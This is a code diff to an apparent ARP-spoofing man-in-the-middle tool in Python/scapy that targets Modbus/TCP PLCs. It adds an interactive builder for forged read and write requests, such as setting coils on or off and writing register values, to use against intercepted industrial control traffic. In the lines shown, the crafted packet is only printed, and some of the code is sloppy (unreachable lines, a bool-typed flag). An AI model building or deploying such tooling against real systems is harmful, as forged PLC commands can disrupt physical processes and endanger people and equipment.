@@ -31,7 +31,17 @@ try:
     from scapy.all import (
         sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,sr
     )
-    from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
+    from scapy.contrib.modbus import (
+    ModbusADURequest,
+    ModbusPDU01ReadCoilsRequest,
+    ModbusPDU02ReadDiscreteInputsRequest,
+    ModbusPDU03ReadHoldingRegistersRequest,
+    ModbusPDU04ReadInputRegistersRequest,
+    ModbusPDU05WriteSingleCoilRequest,
+    ModbusPDU06WriteSingleRegisterRequest,
+    ModbusPDU0FWriteMultipleCoilsRequest,
+    ModbusPDU10WriteMultipleRegistersRequest,
+)
 except ImportError:
     print("scapy is required: pip install scapy --break-system-packages", file=sys.stderr)
     sys.exit(1)
@@ -45,21 +55,20 @@ MODBUS_FUNCTION_CODES = {
     0x04: "Read Input Registers",
     0x05: "Write Single Coil",
     0x06: "Write Single Register",
-    0x07: "Read Exception Status",
-    0x08: "Diagnostics",
-    0x0B: "Get Comm Event Counter",
-    0x0C: "Get Comm Event Log",
     0x0F: "Write Multiple Coils",
     0x10: "Write Multiple Registers",
-    0x11: "Report Server ID",
-    0x14: "Read File Record",
-    0x15: "Write File Record",
-    0x16: "Mask Write Register",
-    0x17: "Read/Write Multiple Registers",
-    0x18: "Read FIFO Queue",
-    0x2B: "Encapsulated Interface Transport",
+
 }
 
+MODBUS_WRITE_REGISTER_FUNCTION_CODES = [
+    0x05,0x06
+]
+
+MODBUS_READ_REGISTER_FUNCTION_CODES = [
+    0x03,0x04
+]
+
+MODBUS_REGISTER_FUNCTION_CODES = MODBUS_WRITE_REGISTER_FUNCTION_CODES + MODBUS_READ_REGISTER_FUNCTION_CODES
 
 def log_line(msg, log_file=None):
     line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {msg}"
@@ -131,7 +140,80 @@ def is_retransmission(pkt):
         print(f"Not a retransmission: {key} seq={seq}")
         return False
 
-def handle_packet(pkt, port, log_file,mappings,own_mac):
+def interactive_packet_craft():
+    p=""
+
+    print("3) Read Register")
+    print("6) Write Register")
+    func_choice = int(input("Select your function: "))
+    print(func_choice)
+    print("Selected: ",MODBUS_FUNCTION_CODES.get(func_choice))
+
+    # return build_pdu(func_choice)
+    return(build_pdu(func_choice))
+    exit(99)
+
+    # if func_choice in MODBUS_REGISTER_FUNCTION_CODES:
+    #     print("Register Function Selected")
+    #     reg_choice = int(input("Enter Target Register: "))
+    #     print("Register Selected: ",reg_choice)
+    #     if func_choice in MODBUS_READ_REGISTER_FUNCTION_CODES:
+    #         print("Read Register Function Selected")
+    #     elif func_choice in MODBUS_WRITE_REGISTER_FUNCTION_CODES:
+    #                 print("Write Register Function Selected")
+    #                 value_choice = int(input("Enter Target Value: "))
+    #                 print("Value Entered: ",value_choice)
+
+
+def build_pdu(func_code: int):
+    """Prompt for the fields relevant to the selected function and return a PDU."""
+    if func_code in (0x01, 0x02, 0x03, 0x04):
+        # All read requests share the same two fields
+        start_addr = int(input("Start address: "), 0)
+        quantity = int(input("Quantity: "))
+
+        if func_code == 0x01:
+            return ModbusPDU01ReadCoilsRequest(startAddr=start_addr, quantity=quantity)
+        elif func_code == 0x02:
+            return ModbusPDU02ReadDiscreteInputsRequest(startAddr=start_addr, quantity=quantity)
+        elif func_code == 0x03:
+            return ModbusPDU03ReadHoldingRegistersRequest(startAddr=start_addr, quantity=quantity)
+        elif func_code == 0x04:
+            return ModbusPDU04ReadInputRegistersRequest(startAddr=start_addr, quantity=quantity)
+
+    elif func_code == 0x05:
+        output_addr = int(input("Coil address: "), 0)
+        state = input("State (on/off): ").strip().lower()
+        output_value = 0xFF00 if state == "on" else 0x0000
+        return ModbusPDU05WriteSingleCoilRequest(outputAddr=output_addr, outputValue=output_value)
+
+    elif func_code == 0x06:
+        reg_addr = int(input("Register address: "), 0)
+        reg_value = int(input("Value to write: "), 0)
+        return ModbusPDU06WriteSingleRegisterRequest(registerAddr=reg_addr, registerValue=reg_value)
+
+    elif func_code == 0x0F:
+        start_addr = int(input("Start address: "), 0)
+        values_str = input("Coil values, comma separated (e.g. 1,0,1,1): ")
+        values = [int(v.strip()) for v in values_str.split(",")]
+        return ModbusPDU0FWriteMultipleCoilsRequest(
+            startAddr=start_addr, quantityOutput=len(values), outputsValue=values
+        )
+
+    elif func_code == 0x10:
+        start_addr = int(input("Start address: "), 0)
+        values_str = input("Register values, comma separated (e.g. 100,200,300): ")
+        values = [int(v.strip(), 0) for v in values_str.split(",")]
+        return ModbusPDU10WriteMultipleRegistersRequest(
+            startAddr=start_addr, quantityRegisters=len(values), outputsValue=values
+        )
+
+    raise ValueError(f"No PDU builder implemented for function code {to_hex(func_code)}")
+
+
+def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
+    if crafted_pkt!="":
+        print(crafted_pkt.show(dump=True))
     src = own_mac
     dst = pkt[IP].dst 
 
@@ -206,7 +288,7 @@ def main():
     ap.add_argument("-t","--target", required=True, help="IP of the Modbus slave (PLC/RTU)")
     ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
     ap.add_argument("--log", help="Optional path to append decoded output to")
-    ap.add_argument("--interactive", help="Craft your own Modbus request")
+    ap.add_argument("--interactive", type=bool, help="Craft your own Modbus request")
     ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
     args = ap.parse_args()
 
@@ -217,6 +299,10 @@ def main():
 
     log_file = open(args.log, "a") if args.log else None
     stop_event = threading.Event()
+
+    crafted_pkt=""
+    if args.interactive:
+        crafted_pkt = interactive_packet_craft()
 
     try:
         conf.iface = args.interface
@@ -248,10 +334,10 @@ def main():
     # bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target})"
 
     mappings = {args.victim:victim_mac,args.target:target_mac}
-    
+
     try:
         sniff(iface=args.interface, filter=bpf_filter,
-              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac), store=False)
+              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac,crafted_pkt), store=False)
         # sniff(iface=args.interface,
         #       prn=lambda p: handle_packet(p, args.port, log_file), store=False)
     except KeyboardInterrupt:
